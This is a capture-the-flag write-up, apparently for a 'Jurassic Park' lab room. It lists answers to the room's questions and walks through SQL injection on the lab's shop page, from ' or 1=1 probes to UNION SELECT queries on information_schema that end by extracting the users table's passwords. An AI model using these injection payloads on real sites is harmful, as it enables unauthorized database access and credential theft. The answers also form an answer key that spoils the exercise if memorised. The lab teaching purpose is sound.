<h1>Jurrasic Park</h1>
<h3>219-day-streak</h3>

<br>

![image](https://github.com/user-attachments/assets/b717ffa4-cb1c-4daa-8ad7-b1223facc961)

<br>

![image](https://github.com/user-attachments/assets/59e91b57-b389-42a5-be27-c74ce6b0cdf4)

<br>

<h2>Task 1. Jurassic Park CTF</h2>

![image](https://github.com/user-attachments/assets/1a9cd97d-0cc1-4b51-95a1-9504c9a86493)

<br>

<p>This medium-hard task will require you to enumerate the web application, get credentials to the server and find four flags hidden around the file system. Oh, Dennis Nedry has helped us to secure the app too.<br>

You'll also want to turn up your device's volume (firefox is recommended). So, deploy the VM and get hacking.<br>

Please connect to our network before deploying the machine.</p>

<br>


<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the question below}}$$ </h3>

> 1.1. <em>What is the name of the SQL database serving the shop information?</em><br><a id='1.1'></a>
>> <code><strong>park</strong></code>

<br>

> 1.2. <em>How many columns does the table have?</em><br><a id='1.2'></a>
>> <code><strong>5</strong></code>

<br>

> 1.3. <em>What is the system version?</em><br><a id='1.3'></a>
>> <code><strong>5</strong></code>

<br>

![image](https://github.com/user-attachments/assets/cb6a330a-2a15-4fea-843b-d97535e0037e)

<br>

![image](https://github.com/user-attachments/assets/a8d4c1a8-7956-4507-8048-12cf4b9b47a9)


<br>

![image](https://github.com/user-attachments/assets/81ccef22-78fa-42f1-b504-e3e99f79a0aa)

<br>

![image](https://github.com/user-attachments/assets/1764a424-d928-4aad-9384-6dd91769012e)


<br>

<p>We have here an</p>

![image](https://github.com/user-attachments/assets/e334d7ce-26a2-4eca-9141-f1ea031600e7)

<br>

![image](https://github.com/user-attachments/assets/246732de-e61c-4e51-aabd-65f365846c04)

<br>

![image](https://github.com/user-attachments/assets/b8a10fb8-91be-4198-8a89-b0d294cec868)

<br>

<p>Dennis is mentinoned in <code>?id=5</code>.  Maybe it is a username?!</p>

![image](https://github.com/user-attachments/assets/8c346ec3-ce19-484a-9635-ee398e48dc4f)

<br>

<p>Let´s try <code>’ or 1=1</code>.</p>

<br>

![image](https://github.com/user-attachments/assets/0817fa73-100f-477a-a75b-39894433fb0f)

<br>

<p>Scrolling down ... </p>

<br>


![image](https://github.com/user-attachments/assets/a5cd1bf1-d168-46ca-afdb-6a515b64988f)

<br>

<p>So it is about <code>SQL Injection</code>!</p>

<br>

![image](https://github.com/user-attachments/assets/68828109-5c37-4ac9-86ea-12affc334438)


<br>

<p><code>' or 1=1 order by 1,2</code> did not work.<br>
<code>' or 1=1 order by 1,2,3</code> did not work.<br>
<code>' or 1=1 order by 1,2,3,4</code> did not work.<br>
<code>' or 1=1 order by 1,2,3,4,5</code> did not work.<br><br>
But guess what?  .... with <code>' or 1=1 ORDER BY 1,2,3,4,5,6</code> the output wass ...</p>

<br>


![image](https://github.com/user-attachments/assets/62412608-4a88-4c2e-8efd-37ef9247a743)

<br>

<p>So we can conclude that thre are <code>5</code> columns!  Leté try <code>UNION</code></p>

<br>

![image](https://github.com/user-attachments/assets/097118f6-9e37-45be-bca5-f53034b80bd6)

<br>


<p>Buy, Buy, Buy</p>

<br>

![image](https://github.com/user-attachments/assets/d3bfe821-a1a6-49f8-a417-88908768be4b)


<br>

![image](https://github.com/user-attachments/assets/a9df154f-133b-4596-b60d-222bd010ad61)

<br>

<pre><code>?id=5%20union%20select%201,group_concat(table_name),3,4,5%20from%20information_schema.tables</code></pre>

<br>

![image](https://github.com/user-attachments/assets/a8f44e9b-199a-4fd7-a26b-80c9d14451bf)

<br>

<pre><code>?id=5 union select 1,group_concat(table_name),3,4,5 from information_schema.tables where table_schema = database()</code></pre>

<br>

![image](https://github.com/user-attachments/assets/3d5d88a9-c949-4c3c-806d-5c51db1e747d)

<p>Let´s have some fun ...</p>


<pre><code>?id=5 union select 1,group_concat(table_name),2000000,1000,199 from information_schema.tables where table_schema = database()</code></pre>

<br>

![image](https://github.com/user-attachments/assets/46ca00f2-7542-48f6-9919-296ee6db8379)

<p>We can notice that there are <code>two tables</code>: <code>items</code> and <code>users</code></p>

<br>

<pre><code>?id=5 union select 1,group_concat(column_name),3,4,5 from information_schema.columns where table_schema = database() and table_name = "users"</code></pre>

<br>

![image](https://github.com/user-attachments/assets/4b3ca1be-e473-411d-8189-c2ea2d22111c)

<br>

<pre><code>?id=5%20union%20select%201,password,3,4,5%20from%20users</code></pre>

![image](https://github.com/user-attachments/assets/669a0148-a62f-48b6-a26d-84550fdcba17)

<br>


![image](https://github.com/user-attachments/assets/e7667ec7-a0c5-46c4-9856-dd9f70352bd4)














































